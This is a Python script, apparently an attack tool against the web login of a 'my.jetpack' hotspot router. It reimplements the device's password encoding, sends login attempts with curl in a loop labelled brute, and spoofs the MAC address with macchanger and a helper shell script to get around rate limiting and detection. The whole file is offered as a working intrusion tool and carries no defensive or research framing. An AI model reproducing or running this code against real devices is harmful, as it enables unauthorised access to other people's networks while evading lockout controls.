import base64
import hashlib
import random
import time
import os
import re
import json
import subprocess
import urllib.parse
import requests


adaptive_delay = 0  # Milliseconds between requests

def get_login_info():
    global adaptive_delay

    login_info_url = "http://my.jetpack/goform/GetLoginInfo"
    
    # Apply adaptive delay if needed
    if adaptive_delay > 0:
        time.sleep(adaptive_delay / 1000)

    for retry in range(3):
        try:
            r = requests.get(login_info_url, timeout=5)
            data = r.json()

            if "priKey" not in data:
                raise ValueError("No priKey in response")

            priKey = data["priKey"]

            if priKey.startswith("x"):
                secret = "0"
                timestamp = priKey[1:]
            else:
                parts = priKey.split("x")
                if len(parts) != 2:
                    raise ValueError(f"Invalid priKey format: {priKey}")
                secret, timestamp = parts

            timestamp_start = int(time.time())
            return secret, timestamp, timestamp_start

        except Exception as e:
            print(f"⚠️ Error getting login info: {e} - Attempt {retry+1}/3")
            time.sleep(2)

    raise ConnectionError("Failed to retrieve valid login info after 3 attempts")

def replace_char_at(s, index, char):
    return s[:index] + char + s[index + 1:]


def check_password_type(pwd):
    if not pwd:
        return 'mix_all'
    isnum = pwd.isdigit()
    islower = pwd.islower()
    isupper = pwd.isupper()
    isspec = all(not c.isalnum() for c in pwd)
    if isnum:
        return 'number'
    elif islower:
        return 'lower'
    elif isupper:
        return 'upper'
    elif isspec:
        return 'spec'
    elif any(c.isdigit() for c in pwd) and any(c.islower() for c in pwd) and any(c.isupper() for c in pwd):
        return 'alpha_num'
    elif any(c.isalnum() for c in pwd) and any(not c.isalnum() for c in pwd):
        return 'mix_all'
    return 'mix_all'


def get_charset(pwd_type):
    # Simplified to always return mix_all charset
    return list("1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ~!@#$%^&*()_+{}:|'[]?,./-=") * 10


def password_encode(password, secret, timestamp, timestamp_start):
    pwd_type = check_password_type(password)
    charset = get_charset(pwd_type)

    num14 = random.randint(1, 4)
    num255 = [random.randint(0, 255) for _ in range(num14)]
    splice_str = ''.join([charset[i] for i in num255])
    splic_pwd = splice_str + password

    parse16 = int(secret, 16)
    for i in range(4):
        idx1 = ((parse16 >> (i * 8)) & 0xFF) % len(splic_pwd)
        idx2 = i % len(splic_pwd)
        splic_pwd = replace_char_at(splic_pwd, idx1, splic_pwd[idx2])
        splic_pwd = replace_char_at(splic_pwd, idx2, splic_pwd[idx1])

    random1 = ''.join([f"{x:02x}" for x in num255])
    time_diff = int(time.time()) - timestamp_start
    time_stamp = int(timestamp, 16) + time_diff
    message = f"{random1}x{time_stamp:x}:{splic_pwd}"
    base64_str = base64.b64encode(message.encode()).decode()

    for i in range(4):
        idx1 = ((parse16 >> (i * 8)) & 0xFF) % len(base64_str)
        idx2 = i % len(base64_str)
        base64_str = replace_char_at(base64_str, idx1, base64_str[idx2])
        base64_str = replace_char_at(base64_str, idx2, base64_str[idx1])

    return base64_str


def spoof_mac(interface='wlan0'):
    print("[*] Spoofing MAC address...")
    try:
        subprocess.run(["sudo", "ip", "link", "set", interface, "down"], check=True)
        subprocess.run(["sudo", "macchanger", "-r", interface], check=True)
        subprocess.run(["sudo", "ip", "link", "set", interface, "up"], check=True)

        print("[*] MAC address spoofed using macchanger.")
        
        result = subprocess.run(["ip", "link", "show", interface], capture_output=True, text=True)
        mac_match = re.search(r'link/ether ([0-9a-f:]{17})', result.stdout)
        if mac_match:
            print(f"[+] Current MAC: {mac_match.group(1)}")
        else:
            print("[!] Could not verify MAC address.")
    except Exception as e:
        print(f"[!] Error spoofing MAC: {e}")

def get_current_mac(interface='wlan0'):
    result = subprocess.run(["ip", "link", "show", interface], capture_output=True, text=True)
    match = re.search(r'link/ether ([0-9a-f:]{17})', result.stdout)
    return match.group(1) if match else None

def run_brute_loop(max_attempts=5):
    last_mac = None
    for attempt in range(max_attempts):
        print(f"\n[*] Attempt {attempt + 1}/{max_attempts}")

        if not last_mac:
            subprocess.run(["./spoof_and_connect.sh"], check=True)
            last_mac = get_current_mac()
            print(f"[*] Current spoofed MAC: {last_mac}")
        else:
            print(f"[*] Reusing MAC: {last_mac}")

        password_plain = input('Enter plaintext pass: ')
        secret, timestamp, timestamp_start = get_login_info()
        md5_hash = hashlib.md5(password_plain.encode()).hexdigest()
        encoded = password_encode(md5_hash, secret, timestamp, timestamp_start)

        username_input = input('Enter username: ')
        username = hashlib.md5(username_input.encode()).hexdigest()
        # Username is hashed using MD5 before being added to the payload
        payload = {
            "username": username,
            "password": encoded
        }

        url = "http://my.jetpack/goform/login"
        curl_command = [
            "curl", "-s", "-X", "POST", url,
            "-H", "Content-Type: application/json",
            "-d", json.dumps(payload)
        ]
        result = subprocess.run(curl_command, capture_output=True, text=True)
        print("Curl response:")
        print(result.stdout)

        try:
            response = json.loads(result.stdout)
            retcode = response.get("retcode")
            if retcode == 0:
                print("[+] Successful login!")
                break
            elif retcode == 201:
                print("[-] Rate-limited. Retrying...")
                continue
            else:
                print("[!] Login failed or detected. Retrying...")
                last_mac = None
                continue
        except Exception as e:
            print(f"[!] Failed to parse response: {e}")
            continue

if __name__ == '__main__':
    run_brute_loop()